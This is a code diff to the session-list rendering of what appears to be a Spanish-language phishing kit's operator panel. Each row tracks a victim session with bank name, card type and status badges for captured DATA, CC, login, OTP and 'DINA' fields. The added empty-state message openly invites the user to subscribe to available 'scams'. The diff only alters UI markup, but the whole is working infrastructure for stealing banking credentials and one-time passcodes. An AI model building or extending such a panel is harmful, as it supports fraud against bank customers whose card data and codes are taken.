@@ -1001,7 +1001,7 @@ function renderList() {
             const hasOtp = !!s.otp;
 
             const bankLabel = !s.bank || s.bank === "null"
-                ? "⏳ esperando🏦..."
+                ? "⏳🏦"
                 : `${s.bank.charAt(0).toUpperCase() + s.bank.slice(1)}`;
             
             const typeLabel = !s.cc || s.cc === "null" && !s.level || s.level === "null"
@@ -1018,44 +1018,51 @@ function renderList() {
 
             // Get project name from map
             const projectName = getProjectName(s.projectId);
+            console.log(items.length)
+            return items.length >= 1 
+            ? `
+                <div class="row ${selected}" onclick="openSession('${escapeHtml(s.id)}')">
+                <div class="rowMain">
+                    <div class="rowTop">
+                    <div class="rowtop-left">
+                        <div class="rowtop-left-id">
+                        ${dot}
+                        <span class="sid">${escapeHtml(s.id)}</span>
+                        </div>
+                        <div class="rowtop-left-name">
+                        <span class="project-slug">${escapeHtml(projectName)}</span>
+                        <br>
+                        <span class="sname">${escapeHtml(s.name ?? "Sin nombre")}</span>
+                        </div>
+                    </div>
+                    <div class="rowtop-rigth">
+                        ${actionLabel}
+                    </div>
+                    </div>
 
-            return `
-        <div class="row ${selected}" onclick="openSession('${escapeHtml(s.id)}')">
-          <div class="rowMain">
-            <div class="rowTop">
-              <div class="rowtop-left">
-                <div class="rowtop-left-id">
-                  ${dot}
-                  <span class="sid">${escapeHtml(s.id)}</span>
+                    <div class="meta">
+                    <div class="bank">
+                        <span class="kv"><b>${escapeHtml(bankLabel)}</b></span>
+                        <span class="kv"><b>${escapeHtml(typeLabel)}</b></span>
+                    </div>
+
+                    <div class="action-details">
+                        <span class="kv-action ${dataCls}"><b>DATA</b></span>
+                        <span class="kv-action ${ccCls}"><b>CC</b></span>
+                        <span class="kv-action ${logoCls}"><b>LOGO</b></span>
+                        <span class="kv-action ${otpCls}"><b>OTP</b></span>
+                        <span class="kv-action ${dinaCls}"><b>DINA</b></span>
+                    </div>
+                    </div>
                 </div>
-                <div class="rowtop-left-name">
-                  <span class="project-slug">${escapeHtml(projectName)}</span>
-                  <br>
-                  <span class="sname">${escapeHtml(s.name ?? "Sin nombre")}</span>
                 </div>
-              </div>
-              <div class="rowtop-rigth">
-                ${actionLabel}
-              </div>
-            </div>
-
-            <div class="meta">
-              <div class="bank">
-                <span class="kv"><b>${escapeHtml(bankLabel)}</b></span>
-                <span class="kv"><b>${escapeHtml(typeLabel)}</b></span>
-              </div>
-
-              <div class="action-details">
-                <span class="kv-action ${dataCls}"><b>DATA</b></span>
-                <span class="kv-action ${ccCls}"><b>CC</b></span>
-                <span class="kv-action ${logoCls}"><b>LOGO</b></span>
-                <span class="kv-action ${otpCls}"><b>OTP</b></span>
-                <span class="kv-action ${dinaCls}"><b>DINA</b></span>
-              </div>
-            </div>
-          </div>
-        </div>
-      `;
+            `
+            : `
+                <div class="alert alert-info mb-0">
+                    <i class="fas fa-info-circle"></i> Aún no estas subscrito a ningun Scam.
+                    <a href="{{ route('projects.available') }}">Ver scams disponibles</a>.
+                </div>
+            `;
         })
         .join("");
 }
